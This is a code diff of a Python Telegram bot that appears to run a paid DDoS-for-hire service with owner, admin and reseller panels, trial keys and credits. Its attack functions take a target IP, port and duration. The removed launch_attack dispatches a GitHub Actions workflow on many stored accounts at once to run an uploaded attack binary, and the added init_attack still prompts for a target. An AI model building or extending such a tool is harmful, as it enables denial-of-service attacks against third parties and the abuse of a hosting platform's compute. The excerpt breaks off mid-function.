+    elif data == "set_max_attacks":
+        await init_set_max_attacks(query, user_id)
+    elif data == "toggle_maintenance":
+        await toggle_maintenance(query, user_id)
+    elif data == "gen_trial_key" or data == "admin_genkey":
+        await init_gen_trial_key(query, user_id)
+    
+    # Admin management
+    elif data == "add_admin":
+        await init_add_admin(query, user_id)
+    elif data == "remove_admin":
+        await init_remove_admin(query, user_id)
+    elif data == "list_admins":
+        await show_admins_list(query)
+    
+    # Reseller management
+    elif data == "add_reseller":
+        await init_add_reseller(query, user_id)
+    elif data == "remove_reseller":
+        await init_remove_reseller(query, user_id)
+    elif data == "add_reseller_credits":
+        await init_add_reseller_credits(query, user_id)
+    elif data == "list_resellers":
+        await show_resellers_list(query)
+    
+    # Reseller actions
     elif data == "reseller_add":
         await init_reseller_add_user(query, user_id)
-    
     elif data == "reseller_remove":
         await init_reseller_remove_user(query, user_id)
-    
     elif data == "reseller_myusers":
         await show_reseller_users(query, user_id)
-    
     elif data == "reseller_credits":
         await show_reseller_credits(query, user_id)
-    
     elif data == "reseller_prices":
         await show_reseller_prices(query)
     
+    # User actions
     elif data == "request_access":
-        await request_access(query, user_id)
-    
+        await request_access(query, user_id, context)
     elif data == "redeem_key":
         await init_redeem_key(query, user_id)
+    elif data == "my_account":
+        await show_my_account(query, user_id)
     
+    # Broadcast
+    elif data == "owner_broadcast":
+        await start_broadcast(query, user_id)
+    
+    # Statistics
+    elif data == "statistics" or data == "admin_stats":
+        await show_statistics(query)
+    
+    # Approve/reject requests
     elif data.startswith("approve_"):
         req_user_id = int(data.split("_")[1])
         await approve_request(query, user_id, req_user_id)
-    
     elif data.startswith("reject_"):
         req_user_id = int(data.split("_")[1])
         await reject_request(query, user_id, req_user_id)
     
-    elif data == "add_admin":
-        await init_add_admin(query, user_id)
-    
-    elif data == "remove_admin":
-        await init_remove_admin(query, user_id)
-    
-    elif data == "list_admins":
-        await show_admins_list(query)
-    
-    elif data == "add_reseller":
-        await init_add_reseller(query, user_id)
-    
-    elif data == "remove_reseller":
-        await init_remove_reseller(query, user_id)
-    
-    elif data == "add_reseller_credits":
-        await init_add_reseller_credits(query, user_id)
-    
-    elif data == "list_resellers":
-        await show_resellers_list(query)
-    
+    # Cancel
     elif data == "cancel":
         user_states[user_id] = None
         await query.edit_message_text("❌ Operation cancelled.", reply_markup=get_back_keyboard())
 
+# Panel display functions
 async def show_owner_panel(query):
     text = f"""
 👑 **OWNER PANEL**
 
-Welcome to the owner control panel.
-Select an option below to manage the bot.
+Welcome to owner control panel.
 
-🔑 Total Servers: {len(github_tokens)}
-👥 Total Users: {len(approved_users)}
-💰 Total Resellers: {len(resellers)}
-🛡️ Total Admins: {len(admins)}
+🔑 Servers: {len(github_tokens)}
+👥 Users: {len(approved_users)}
+💰 Resellers: {len(resellers)}
+🛡️ Admins: {len(admins)}
 """
-    
     keyboard = get_owner_panel_keyboard()
     await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
 
 async def show_admin_panel(query):
     pending_count = len(load_pending_users())
-    
     text = f"""
 🛡️ **ADMIN PANEL**
 
-Manage users and view statistics.
+Manage users and requests.
 
-👥 Approved Users: {len(approved_users)}
-📝 Pending Requests: {pending_count}
+👥 Users: {len(approved_users)}
+📝 Pending: {pending_count}
 """
-    
     keyboard = get_admin_panel_keyboard()
     await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
 
 async def show_reseller_panel(query):
     user_id = query.from_user.id
     reseller_data = resellers[str(user_id)]
-    
     text = f"""
 💰 **RESELLER PANEL**
 
 Welcome, {query.from_user.username or 'Reseller'}!
 
-💳 Your Credits: {reseller_data.get('credits', 0)} days
+💳 Credits: {reseller_data.get('credits', 0)} days
 👥 Users Added: {reseller_data.get('users_added', 0)}
-📅 Member Since: {reseller_data.get('added_date', 'N/A')}
 """
-    
     keyboard = get_reseller_panel_keyboard()
-    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
-
-async def show_attack_panel(query):
-    global current_attack, cooldown_until
-    
-    text = "⚔️ **ATTACK PANEL**\n\n"
-    
-    if MAINTENANCE_MODE:
-        text += "🔧 **Status**: Maintenance Mode\n"
-        text += "All attacks are disabled.\n"
-    elif current_attack:
-        text += f"🚀 **Status**: Attack Running\n"
-        text += f"🎯 Target: {current_attack.get('target')}\n"
-        text += f"🔌 Port: {current_attack.get('port')}\n"
-    elif cooldown_until > time.time():
-        remaining = int(cooldown_until - time.time())
-        text += f"⏳ **Status**: Cooldown ({remaining}s)\n"
-    else:
-        text += "✅ **Status**: Ready\n"
-    
-    text += f"\n🔑 Active Servers: {len(github_tokens)}\n"
-    
-    keyboard = get_attack_panel_keyboard()
     await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
 
 async def show_user_management(query):
     text = """
 👥 **USER MANAGEMENT**
 
-Manage approved users and pending requests.
-
-Select an action below:
+Manage approved users and requests.
 """
-    
     keyboard = get_user_management_keyboard()
     await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
 
@@ -956,10 +855,7 @@ async def show_admin_management(query):
 🛡️ **ADMIN MANAGEMENT**
 
 Total Admins: {len(admins)}
-
-Admins can manage users and approve requests.
 """
-    
     keyboard = get_admin_management_keyboard()
     await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
 
@@ -968,10 +864,7 @@ async def show_reseller_management(query):
 💰 **RESELLER MANAGEMENT**
 
 Total Resellers: {len(resellers)}
-
-Resellers can add users using their credits.
 """
-    
     keyboard = get_reseller_management_keyboard()
     await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
 
@@ -980,10 +873,7 @@ async def show_server_management(query):
 🔑 **SERVER MANAGEMENT**
 
 Total Servers: {len(github_tokens)}
-
-Manage GitHub tokens and binary files.
 """
-    
     keyboard = get_server_management_keyboard()
     await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
 
@@ -995,63 +885,146 @@ async def show_settings(query):
 🎯 Max Attacks: {MAX_ATTACKS}
 🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}
 """
-    
     keyboard = get_settings_keyboard()
     await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
 
-async def show_pending_requests(query):
+async def show_statistics(query):
+    text = f"""
+📊 **BOT STATISTICS**
+
+👥 Users: {len(approved_users)}
+🛡️ Admins: {len(admins)}
+💰 Resellers: {len(resellers)}
+🔑 Servers: {len(github_tokens)}
+📝 Pending: {len(load_pending_users())}
+"""
+    keyboard = get_back_keyboard()
+    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
+
+async def show_my_account(query, user_id):
+    text = "📌 **YOUR ACCESS**\n\n"
+    
+    if is_owner(user_id):
+        owner_data = owners[str(user_id)]
+        text += f"👑 Role: Owner\n"
+        text += f"✅ Status: Full Access\n"
+        text += f"📅 Since: {owner_data.get('added_date', 'N/A')}\n"
+    elif is_admin(user_id):
+        admin_data = admins[str(user_id)]
+        text += f"🛡️ Role: Admin\n"
+        text += f"✅ Status: Active\n"
+        text += f"📅 Since: {admin_data.get('added_date', 'N/A')}\n"
+    elif is_reseller(user_id):
+        reseller_data = resellers[str(user_id)]
+        text += f"💰 Role: Reseller\n"
+        text += f"💳 Credits: {reseller_data.get('credits', 0)} days\n"
+        text += f"👥 Users: {reseller_data.get('users_added', 0)}\n"
+    elif is_approved_user(user_id):
+        user_data = approved_users[str(user_id)]
+        text += f"✅ Status: Active\n"
+        text += f"⏰ Expires: {format_time_remaining(user_data['expiry_date'])}\n"
+        text += f"📋 Plan: {user_data.get('plan', 'N/A')}\n"
+    else:
+        text += "❌ Status: No Access\n"
+    
+    keyboard = get_back_keyboard()
+    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
+
+logger.info("✅ Part 4: Button handlers loaded")
+
+# Part 5: Action Functions (Attack, Requests, Management)
+
+async def init_attack(query, user_id, context):
+    global current_attack, cooldown_until
+    
+    if MAINTENANCE_MODE:
+        await query.answer("🔧 Maintenance mode active!", show_alert=True)
+        return
+    
+    if current_attack:
+        await query.answer("⚠️ Attack already running!", show_alert=True)
+        return
+    
+    if cooldown_until > time.time():
+        remaining = int(cooldown_until - time.time())
+        await query.answer(f"⏳ Cooldown: {remaining}s left", show_alert=True)
+        return
+    
+    if not github_tokens:
+        await query.answer("❌ No servers available!", show_alert=True)
+        return
+    
+    user_states[user_id] = {"state": WAITING_FOR_IP, "action": "attack", "data": {}}
+    
+    await query.edit_message_text(
+        "🎯 **LAUNCH ATTACK**\n\nEnter target IP address:",
+        reply_markup=get_cancel_keyboard()
+    )
+
+async def stop_attack_callback(query, user_id):
+    global current_attack
+    
+    if not current_attack:
+        await query.answer("⚠️ No active attack", show_alert=True)
+        return
+    
+    if is_owner(user_id) or is_admin(user_id) or current_attack.get('user_id') == user_id:
+        current_attack = None
+        save_attack_state()
+        await query.answer("✅ Attack stopped!", show_alert=True)
+        await query.edit_message_text("✅ **ATTACK STOPPED**", reply_markup=get_back_keyboard())
+    else:
+        await query.answer("❌ Only your own attacks!", show_alert=True)
+
+async def show_pending_requests(query, context):
     pending = load_pending_users()
     
     if not pending:
-        text = "📭 **NO PENDING REQUESTS**\n\nAll requests have been processed."
+        text = "📭 **NO PENDING REQUESTS**"
         keyboard = get_back_keyboard()
         await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
         return
     
-    text = "📝 **PENDING ACCESS REQUESTS**\n\n"
+    text = "📝 **PENDING REQUESTS**\n\n"
     
     for i, req in enumerate(pending[:10], 1):
         req_user_id = req['user_id']
         username = req.get('username', 'Unknown')
         date = req.get('date', 'N/A')
-        text += f"{i}. 👤 @{username}\n"
-        text += f"   🆔 ID: `{req_user_id}`\n"
-        text += f"   📅 {date}\n\n"
+        text += f"{i}. @{username}\n   🆔 {req_user_id}\n   📅 {date}\n\n"
     
     if len(pending) > 10:
-        text += f"\n... and {len(pending) - 10} more requests"
+        text += f"... and {len(pending) - 10} more"
     
-    text += f"\n\n📊 Total Pending: {len(pending)}"
-    text += "\n\n💡 Click on a request to approve/reject:"
+    text += f"\n📊 Total: {len(pending)}"
     
     keyboard = []
     for req in pending[:10]:
         req_user_id = req['user_id']
         username = req.get('username', 'Unknown')[:15]
-        keyboard.append([InlineKeyboardButton(f"👤 {username} - {req_user_id}", callback_data=f"view_req_{req_user_id}")])
+        keyboard.append([
+            InlineKeyboardButton(f"✅ {username}", callback_data=f"approve_{req_user_id}"),
+            InlineKeyboardButton(f"❌ {username}", callback_data=f"reject_{req_user_id}")
+        ])
     
     keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="owner_panel" if is_owner(query.from_user.id) else "admin_panel")])
     
     await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
 
-async def request_access(query, user_id):
+async def request_access(query, user_id, context):
     pending = load_pending_users()
     
-    for req in pending:
-        if req['user_id'] == user_id:
-            await query.edit_message_text(
-                "⚠️ **REQUEST ALREADY SENT**\n\n"
-                "Your access request is pending approval.\n"
-                "Please wait for an owner/admin to review it.",
-                reply_markup=get_back_keyboard(),
-                parse_mode='Markdown'
-            )
-            return
+    if any(req['user_id'] == user_id for req in pending):
+        await query.edit_message_text(
+            "⚠️ **REQUEST ALREADY SENT**\n\nPending approval.",
+            reply_markup=get_back_keyboard(),
+            parse_mode='Markdown'
+        )
+        return
     
     if is_approved_user(user_id):
         await query.edit_message_text(
-            "✅ **YOU ALREADY HAVE ACCESS**\n\n"
-            "Your account is active!",
+            "✅ **YOU HAVE ACCESS**",
             reply_markup=get_back_keyboard(),
             parse_mode='Markdown'
         )
@@ -1069,15 +1042,12 @@ async def request_access(query, user_id):
     save_pending_users(pending)
     
     await query.edit_message_text(
-        "✅ **ACCESS REQUEST SENT!**\n\n"
-        "Your request has been sent to the owners.\n"
-        "You'll be notified once it's approved.\n\n"
-        "🆔 Your ID: `" + str(user_id) + "`\n"
-        "📅 Date: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        "✅ **REQUEST SENT!**\n\nWait for approval.\n\n🆔 Your ID: `" + str(user_id) + "`",
         reply_markup=get_back_keyboard(),
         parse_mode='Markdown'
     )
     
+    # FIXED: Notify all owners
     for owner_id in owners.keys():
         try:
             await context.bot.send_message(
@@ -1085,175 +1055,12 @@ async def request_access(query, user_id):
                 text=f"📢 **NEW ACCESS REQUEST**\n\n"
                      f"👤 User: @{username}\n"
                      f"🆔 ID: `{user_id}`\n"
-                     f"📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-                     f"Use /start to view pending requests.",
+                     f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+                     f"Use /start to view requests.",
                 parse_mode='Markdown'
             )
         except:
             pass
-
-async def show_statistics(query):
-    text = f"""
-📊 **BOT STATISTICS**
-
-👥 Total Approved Users: {len(approved_users)}
-🛡️ Total Admins: {len(admins)}
-💰 Total Resellers: {len(resellers)}
-👑 Total Owners: {len(owners)}
-🔑 Active Servers: {len(github_tokens)}
-📝 Pending Requests: {len(load_pending_users())}
-
-⚙️ **System Status**:
-🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}
-⏱️ Cooldown: {COOLDOWN_DURATION}s
-🎯 Max Attacks: {MAX_ATTACKS}
-"""
-    
-    keyboard = get_back_keyboard()
-    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
-
-async def show_my_account(query, user_id):
-    if not is_approved_user(user_id):
-        await query.edit_message_text("❌ You don't have an active account.", reply_markup=get_back_keyboard())
-        return
-    
-    user_data = approved_users[str(user_id)]
-    expiry = user_data['expiry_date']
-    remaining = format_time_remaining(expiry)
-    
-    text = f"""
-📊 **MY ACCOUNT**
-
-👤 Username: @{user_data.get('username', 'Unknown')}
-🆔 User ID: `{user_id}`
-⏰ Time Left: {remaining}
-📅 Expires: {expiry}
-👤 Added By: {user_data.get('added_by', 'Unknown')}
-📦 Plan: {user_data.get('plan', 'Standard')}
-"""
-    
-    keyboard = get_back_keyboard()
-    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
-
-logger.info("✅ Part 4: Button handlers loaded")
-
-async def init_attack(query, user_id):
-    global current_attack, cooldown_until
-    
-    if MAINTENANCE_MODE:
-        await query.answer("🔧 Maintenance mode is active!", show_alert=True)
-        return
-    
-    if current_attack:
-        await query.answer("⚠️ Another attack is already running!", show_alert=True)
-        return
-    
-    if cooldown_until > time.time():
-        remaining = int(cooldown_until - time.time())
-        await query.answer(f"⏳ Please wait {remaining}s", show_alert=True)
-        return
-    
-    if not github_tokens:
-        await query.answer("❌ No servers available!", show_alert=True)
-        return
-    
-    user_states[user_id] = {"state": WAITING_FOR_IP, "data": {}}
-    
-    await query.edit_message_text(
-        "🎯 **START ATTACK**\n\n"
-        "Please enter the target IP address:",
-        reply_markup=get_cancel_keyboard(),
-        parse_mode='Markdown'
-    )
-
-async def stop_attack_callback(query, user_id):
-    global current_attack
-    
-    if not current_attack:
-        await query.answer("⚠️ No active attack to stop!", show_alert=True)
-        return
-    
-    if not (is_owner(user_id) or is_admin(user_id) or current_attack.get('user_id') == user_id):
-        await query.answer("❌ You can only stop your own attacks!", show_alert=True)
-        return
-    
-    current_attack = None
-    save_attack_state()
-    
-    await query.edit_message_text(
-        "✅ **ATTACK STOPPED**\n\n"
-        "The current attack has been terminated.",
-        reply_markup=get_back_keyboard(),
-        parse_mode='Markdown'
-    )
-
-async def launch_attack(target, port, duration, user_id, username, message):
-    global current_attack, cooldown_until
-    
-    current_attack = {
-        "target": target,
-        "port": port,
-        "time": duration,
-        "user": username,
-        "user_id": user_id,
-        "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    }
-    save_attack_state()
-    
-    if user_id not in user_attack_counts:
-        user_attack_counts[user_id] = 0
-    user_attack_counts[user_id] += 1
-    
-    def run_attack(token_data):
-        try:
-            g = Github(token_data['token'])
-            repo = g.get_repo(token_data['repo'])
-            
-            try:
-                workflow = repo.get_workflow("main.yml")
-                workflow.create_dispatch(
-                    ref="main",
-                    inputs={
-                        "target": target,
-                        "port": str(port),
-                        "time": str(duration)
-                    }
-                )
-                logger.info(f"Attack launched on {token_data['username']}")
-            except Exception as e:
-                logger.error(f"Workflow dispatch error on {token_data['username']}: {e}")
-        except Exception as e:
-            logger.error(f"Attack error on {token_data['username']}: {e}")
-    
-    threads = []
-    for token_data in github_tokens:
-        thread = threading.Thread(target=run_attack, args=(token_data,))
-        threads.append(thread)
-        thread.start()
-    
-    for thread in threads:
-        thread.join()
-    
-    cooldown_until = time.time() + COOLDOWN_DURATION
-    save_attack_state()
-    
-    await message.reply_text(
-        f"✅ **ATTACK LAUNCHED!**\n\n"
-        f"🎯 Target: `{target}`\n"
-        f"🔌 Port: `{port}`\n"
-        f"⏱️ Duration: `{duration}s`\n"
-        f"🔑 Servers: `{len(github_tokens)}`\n\n"
-        f"⏳ Cooldown: {COOLDOWN_DURATION}s",
-        reply_markup=get_back_keyboard(),
-        parse_mode='Markdown'
-    )
-    
-    import asyncio
-    await asyncio.sleep(duration)
-    
-    if current_attack and current_attack.get('user_id') == user_id:
-        current_attack = None
-        save_attack_state()
 
 async def approve_request(query, admin_id, req_user_id):
     if not (is_owner(admin_id) or is_admin(admin_id)):
@@ -1282,10 +1089,7 @@ async def approve_request(query, admin_id, req_user_id):
     save_pending_users(pending)
     
     await query.edit_message_text(
-        f"✅ **APPROVING REQUEST**\n\n"
-        f"👤 User: @{req_data.get('username')}\n"
-        f"🆔 ID: `{req_user_id}`\n\n"
-        f"Enter the number of days for access:",
+        f"✅ **APPROVING**\n\n@{req_data.get('username')}\n🆔 {req_user_id}\n\nEnter days:",
         reply_markup=get_cancel_keyboard(),
         parse_mode='Markdown'
     )
@@ -1305,135 +1109,93 @@ async def reject_request(query, admin_id, req_user_id):
             break
     
     if not req_data:
-        await query.answer("❌ Request not found!", show_alert=True)
+        await query.answer("❌ Not found!", show_alert=True)
         return
     
     save_pending_users(pending)
     
     await query.edit_message_text(
-        f"❌ **REQUEST REJECTED**\n\n"
-        f"👤 User: @{req_data.get('username')}\n"
-        f"🆔 ID: `{req_user_id}`\n\n"
-        f"The request has been rejected.",
+        f"❌ **REJECTED**\n\n@{req_data.get('username')}",
         reply_markup=get_back_keyboard(),
         parse_mode='Markdown'
     )
 
+# Init functions for various operations
 async def init_add_user(query, user_id):
     user_states[user_id] = {"state": WAITING_FOR_USER_ID, "action": "add", "data": {}}
-    
-    await query.edit_message_text(
-        "➕ **ADD USER**\n\n"
-        "Please enter the User ID:",
-        reply_markup=get_cancel_keyboard()
-    )
+    await query.edit_message_text("➕ **ADD USER**\n\nEnter User ID:", reply_markup=get_cancel_keyboard())
 
 async def init_remove_user(query, user_id):
     user_states[user_id] = {"state": WAITING_FOR_REMOVE_ID, "action": "remove"}
-    
-    await query.edit_message_text(
-        "➖ **REMOVE USER**\n\n"
-        "Please enter the User ID to remove:",
-        reply_markup=get_cancel_keyboard()
-    )
+    await query.edit_message_text("➖ **REMOVE USER**\n\nEnter User ID:", reply_markup=get_cancel_keyboard())
 
 async def show_users_list(query):
     if not approved_users:
-        text = "📭 No approved users yet."
+        text = "📭 No users yet."
     else:
-        text = "👥 **APPROVED USERS LIST**\n\n"
+        text = "👥 **USERS**\n\n"
         for i, (uid, data) in enumerate(list(approved_users.items())[:20], 1):
             username = data.get('username', 'Unknown')
-            expiry = data.get('expiry_date', 'N/A')
-            remaining = format_time_remaining(expiry)
-            text += f"{i}. @{username}\n"
-            text += f"   🆔 {uid}\n"
-            text += f"   ⏰ {remaining}\n\n"
+            remaining = format_time_remaining(data.get('expiry_date', ''))
+            text += f"{i}. @{username}\n   🆔 {uid}\n   ⏰ {remaining}\n\n"
         
         if len(approved_users) > 20:
-            text += f"\n... and {len(approved_users) - 20} more users"
+            text += f"... and {len(approved_users) - 20} more"
         
-        text += f"\n📊 Total Users: {len(approved_users)}"
+        text += f"\n📊 Total: {len(approved_users)}"
     
-    keyboard = get_back_keyboard()
-    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
+    await query.edit_message_text(text, reply_markup=get_back_keyboard(), parse_mode='Markdown')
 
 async def init_add_server(query, user_id):
     user_states[user_id] = {"state": WAITING_FOR_TOKEN}
-    
-    await query.edit_message_text(
-        "➕ **ADD SERVER**\n\n"
-        "Please send your GitHub Personal Access Token:",
-        reply_markup=get_cancel_keyboard()
-    )
+    await query.edit_message_text("➕ **ADD SERVER**\n\nSend GitHub token:", reply_markup=get_cancel_keyboard())
 
 async def init_remove_server(query, user_id):
     if not github_tokens:
-        await query.edit_message_text(
-            "📭 No servers to remove.",
-            reply_markup=get_back_keyboard()
-        )
+        await query.edit_message_text("📭 No servers.", reply_markup=get_back_keyboard())
         return
     
-    text = "🔑 **SELECT SERVER TO REMOVE**\n\n"
+    text = "🔑 **SELECT SERVER**\n\n"
     for i, token_data in enumerate(github_tokens, 1):
-        text += f"{i}. {token_data['username']} - {token_data['repo']}\n"
+        text += f"{i}. {token_data['username']}\n"
     
-    text += "\nReply with the server number:"
-    
+    text += "\nReply with number:"
     user_states[user_id] = {"state": "select_server_remove"}
-    
     await query.edit_message_text(text, reply_markup=get_cancel_keyboard())
 
 async def show_servers_list(query):
     if not github_tokens:
-        text = "📭 No servers added yet."
+        text = "📭 No servers."
     else:
-        text = "🔑 **SERVERS LIST**\n\n"
+        text = "🔑 **SERVERS**\n\n"
         for i, token_data in enumerate(github_tokens, 1):
-            text += f"{i}. 👤 {token_data['username']}\n"
-            text += f"   📁 {token_data['repo']}\n"
-            text += f"   📅 {token_data.get('added_date', 'N/A')}\n\n"
-        
-        text += f"📊 Total Servers: {len(github_tokens)}"
+            text += f"{i}. {token_data['username']}\n   📁 {token_data['repo']}\n\n"
+        text += f"📊 Total: {len(github_tokens)}"
     
-    keyboard = get_back_keyboard()
-    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
+    await query.edit_message_text(text, reply_markup=get_back_keyboard(), parse_mode='Markdown')
 
 async def init_upload_binary(query, user_id):
     if not github_tokens:
-        await query.edit_message_text(
-            "❌ No servers available!\n\nAdd servers first.",
-            reply_markup=get_back_keyboard()
-        )
+        await query.edit_message_text("❌ No servers!", reply_markup=get_back_keyboard())
         return
     
     user_states[user_id] = {"state": WAITING_FOR_BINARY}
-    
     await query.edit_message_text(
-        "📤 **UPLOAD BINARY**\n\n"
-        "Please send your binary file.\n"
-        f"It will be uploaded as '{BINARY_FILE_NAME}' to all servers.",
+        f"📤 **UPLOAD BINARY**\n\nSend file (will be '{BINARY_FILE_NAME}'):",
         reply_markup=get_cancel_keyboard()
     )
 
 async def init_set_cooldown(query, user_id):
     user_states[user_id] = {"state": WAITING_FOR_COOLDOWN}
-    
     await query.edit_message_text(
-        f"⏱️ **SET COOLDOWN**\n\n"
-        f"Current: {COOLDOWN_DURATION}s\n\n"
-        "Enter new cooldown duration (in seconds):",
+        f"⏱️ **SET COOLDOWN**\n\nCurrent: {COOLDOWN_DURATION}s\n\nEnter new (seconds):",
         reply_markup=get_cancel_keyboard()
     )
 
 async def init_set_max_attacks(query, user_id):
     user_states[user_id] = {"state": WAITING_FOR_MAX_ATTACKS}
-    
     await query.edit_message_text(
-        f"🎯 **SET MAX ATTACKS**\n\n"
-        f"Current: {MAX_ATTACKS}\n\n"
-        "Enter new max attacks limit:",
+        f"🎯 **SET MAX**\n\nCurrent: {MAX_ATTACKS}\n\nEnter new:",
         reply_markup=get_cancel_keyboard()
     )
 
@@ -1443,26 +1205,16 @@ async def toggle_maintenance(query, user_id):
     save_maintenance_mode(MAINTENANCE_MODE)
     
     status = "ON ✅" if MAINTENANCE_MODE else "OFF ❌"
-    await query.answer(f"Maintenance mode: {status}", show_alert=True)
+    await query.answer(f"Maintenance: {status}", show_alert=True)
     await show_settings(query)
 
 async def init_gen_trial_key(query, user_id):
     user_states[user_id] = {"state": WAITING_FOR_TRIAL_HOURS}
-    
-    await query.edit_message_text(
-        "🎁 **GENERATE TRIAL KEY**\n\n"
-        "Enter the number of hours for the trial key:",
-        reply_markup=get_cancel_keyboard()
-    )
+    await query.edit_message_text("🎁 **GENERATE KEY**\n\nEnter hours:", reply_markup=get_cancel_keyboard())
 
 async def init_redeem_key(query, user_id):
     user_states[user_id] = {"state": WAITING_FOR_REDEEM_KEY}
-    
-    await query.edit_message_text(
-        "🎁 **REDEEM TRIAL KEY**\n\n"
-        "Please enter your trial key:",
-        reply_markup=get_cancel_keyboard()
-    )
+    await query.edit_message_text("🎁 **REDEEM KEY**\n\nEnter key:", reply_markup=get_cancel_keyboard())
 
 async def start_broadcast(query, user_id):
     if not is_owner(user_id):
@@ -1470,161 +1222,100 @@ async def start_broadcast(query, user_id):
         return
     
     user_states[user_id] = {"state": WAITING_FOR_BROADCAST}
-    
-    await query.edit_message_text(
-        "📢 **BROADCAST MESSAGE**\n\n"
-        "Send the message you want to broadcast to all users:",
-        reply_markup=get_cancel_keyboard()
-    )
+    await query.edit_message_text("📢 **BROADCAST**\n\nSend message:", reply_markup=get_cancel_keyboard())
 
 async def init_add_admin(query, user_id):
     user_states[user_id] = {"state": "add_admin_id"}
-    
-    await query.edit_message_text(
-        "➕ **ADD ADMIN**\n\n"
-        "Enter the User ID:",
-        reply_markup=get_cancel_keyboard()
-    )
+    await query.edit_message_text("➕ **ADD ADMIN**\n\nEnter ID:", reply_markup=get_cancel_keyboard())
 
 async def init_remove_admin(query, user_id):
     user_states[user_id] = {"state": "remove_admin_id"}
-    
-    await query.edit_message_text(
-        "➖ **REMOVE ADMIN**\n\n"
-        "Enter the Admin ID to remove:",
-        reply_markup=get_cancel_keyboard()
-    )
+    await query.edit_message_text("➖ **REMOVE ADMIN**\n\nEnter ID:", reply_markup=get_cancel_keyboard())
 
 async def show_admins_list(query):
     if not admins:
-        text = "📭 No admins added yet."
+        text = "📭 No admins."
     else:
-        text = "🛡️ **ADMINS LIST**\n\n"
+        text = "🛡️ **ADMINS**\n\n"
         for i, (admin_id, data) in enumerate(admins.items(), 1):
-            text += f"{i}. @{data.get('username', 'Unknown')}\n"
-            text += f"   🆔 {admin_id}\n"
-            text += f"   📅 {data.get('added_date', 'N/A')}\n\n"
-        
-        text += f"📊 Total Admins: {len(admins)}"
+            text += f"{i}. @{data.get('username', 'Unknown')}\n   🆔 {admin_id}\n\n"
+        text += f"📊 Total: {len(admins)}"
     
-    keyboard = get_back_keyboard()
-    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
+    await query.edit_message_text(text, reply_markup=get_back_keyboard(), parse_mode='Markdown')
 
 async def init_add_reseller(query, user_id):
     user_states[user_id] = {"state": "add_reseller_id"}
-    
-    await query.edit_message_text(
-        "➕ **ADD RESELLER**\n\n"
-        "Enter the User ID:",
-        reply_markup=get_cancel_keyboard()
-    )
+    await query.edit_message_text("➕ **ADD RESELLER**\n\nEnter ID:", reply_markup=get_cancel_keyboard())
 
 async def init_remove_reseller(query, user_id):
     user_states[user_id] = {"state": "remove_reseller_id"}
-    
-    await query.edit_message_text(
-        "➖ **REMOVE RESELLER**\n\n"
-        "Enter the Reseller ID to remove:",
-        reply_markup=get_cancel_keyboard()
-    )
+    await query.edit_message_text("➖ **REMOVE RESELLER**\n\nEnter ID:", reply_markup=get_cancel_keyboard())
 
 async def init_add_reseller_credits(query, user_id):
     user_states[user_id] = {"state": "add_credits_id"}
-    
-    await query.edit_message_text(
-        "💳 **ADD RESELLER CREDITS**\n\n"
-        "Enter the Reseller ID:",
-        reply_markup=get_cancel_keyboard()
-    )
+    await query.edit_message_text("💳 **ADD CREDITS**\n\nEnter Reseller ID:", reply_markup=get_cancel_keyboard())
 
 async def show_resellers_list(query):
     if not resellers:
-        text = "📭 No resellers added yet."
+        text = "📭 No resellers."
     else:
-        text = "💰 **RESELLERS LIST**\n\n"
+        text = "💰 **RESELLERS**\n\n"
         for i, (res_id, data) in enumerate(resellers.items(), 1):
-            text += f"{i}. @{data.get('username', 'Unknown')}\n"
-            text += f"   🆔 {res_id}\n"
-            text += f"   💳 Credits: {data.get('credits', 0)} days\n\n"
-        
-        text += f"📊 Total Resellers: {len(resellers)}"
+            text += f"{i}. @{data.get('username', 'Unknown')}\n   💳 {data.get('credits', 0)} days\n\n"
+        text += f"📊 Total: {len(resellers)}"
     
-    keyboard = get_back_keyboard()
-    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')
+    await query.edit_message_text(text, reply_markup=get_back_keyboard(), parse_mode='Markdown')
 
 async def init_reseller_add_user(query, user_id):
     user_states[user_id] = {"state": "reseller_add_user_id"}
-    
-    await query.edit_message_text(
-        "➕ **ADD USER**\n\n"
-        "Enter the User ID:",
-        reply_markup=get_cancel_keyboard()
-    )
+    await query.edit_message_text("➕ **ADD USER**\n\nEnter ID:", reply_markup=get_cancel_keyboard())
 
 async def init_reseller_remove_user(query, user_id):
     user_states[user_id] = {"state": "reseller_remove_user_id"}
-    
-    await query.edit_message_text(
-        "➖ **REMOVE USER**\n\n"
-        "Enter the User ID to remove:",
-        reply_markup=get_cancel_keyboard()
-    )
+    await query.edit_message_text("➖ **REMOVE USER**\n\nEnter ID:", reply_markup=get_cancel_keyboard())
 
 async def show_reseller_users(query, user_id):
     reseller_users = [uid for uid, data in approved_users.items() if data.get('added_by') == str(user_id)]
     
     if not reseller_users:
-        text = "📭 You haven't added any users yet."
+        text = "📭 No users yet."
     else:
         text = "👥 **YOUR USERS**\n\n"
         for i, uid in enumerate(reseller_users[:20], 1):
             data = approved_users[uid]
-            username = data.get('username', 'Unknown')
-            remaining = format_time_remaining(data['expiry_date'])
-            text += f"{i}. @{username}\n"
-            text += f"   🆔 {uid}\n"
